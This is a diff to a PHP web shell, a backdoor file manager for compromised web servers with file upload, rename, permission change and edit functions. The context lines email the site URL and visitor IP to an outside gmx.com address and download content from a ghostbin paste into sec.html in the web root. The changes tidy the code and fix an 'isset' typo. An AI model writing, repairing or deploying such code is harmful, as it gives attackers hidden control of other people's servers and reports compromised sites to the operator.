@@ -5,14 +5,11 @@ $boss = 'zsec@gmx.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ip = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($boss, "ADAHEKER", $ip, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?><?php
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
 $text3 = file_get_contents('https://ghostbin.co/paste/oswh6/raw');
 $op3=fopen($check3, 'w');
 fwrite($op3,$text3);
 fclose($op3);
-?>
-<?php
 error_reporting(0);
 set_time_limit(0);
 if(get_magic_quotes_gpc()){
@@ -80,6 +77,11 @@ if($i != $id) echo "/";
 echo '">'.$pat.'</a>/';
 }
 echo '</td></tr><tr><td>';
+echo '<form enctype="multipart/form-data" method="POST">
+<font color="white">File Upload :</font> <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
 echo '<font color="green">✓</font><font color="white"> Success Upload </font><font color="green">✓</font><br/>';
@@ -87,11 +89,6 @@ echo '<font color="green">✓</font><font color="white"> Success Upload </font><
 echo '<font color="red">×</font><font color="white"> Cannot Upload </font><font color="red">×</font><br><br/>';
 }
 }
-echo '<form enctype="multipart/form-data" method="POST">
-<font color="white">File Upload :</font> <input type="file" name="file" />
-<input type="submit" value="upload" />
-</form>
-</td></tr>';
 if(isset($_GET['filesrc'])){
 echo '<tr><td><font color="white">Current File : </font>'.$_GET['filesrc'].
 '</tr></td></table><br/>';
@@ -113,7 +110,7 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 <input type="submit" value="Go" />
 </form>';
 }elseif($_POST['opt'] == 'rename'){
-if(asset($_POST['newname'])){
+if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
 echo '<font color="green">✓</font></font><br><br/><font color="white"> Name Success Change </font><font color="green">✓</font><br><br/><br><br/>';
 }else{
@@ -131,7 +128,7 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
 if(isset($_POST['src'])){
 $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
-echo '<font color="green">✓</font></font><br><br/><font color="white"> File Success Edit </font><font color="green">✓</font></font><br><br/>';
+echo '<font color="green">✓</font></font><font color="white"> File Success Edit </font><font color="green">✓</font></font><br><br/>';
 }else{
 echo '<font color="red">×</font><font color="white"> File Cannot Edit  </font><font color="red">×</font><br><br/>';
 }
